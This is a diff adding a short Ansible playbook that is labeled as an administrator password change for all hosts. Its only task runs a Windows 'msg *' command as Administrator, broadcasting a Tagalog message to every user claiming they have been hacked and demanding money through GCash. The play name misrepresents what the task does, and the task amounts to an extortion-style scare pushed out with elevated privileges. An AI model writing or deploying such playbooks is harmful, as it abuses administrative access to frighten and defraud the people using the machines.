@@ -1,0 +1,9 @@
+---
+- name: Change Administrator Password
+  hosts: all
+  gather_facts: no
+  tasks:
+    - name: Send Notification
+      win_shell: msg * Nahack ka penge pera sa gcash dali na
+      become: yes
+      become_user: Administrator
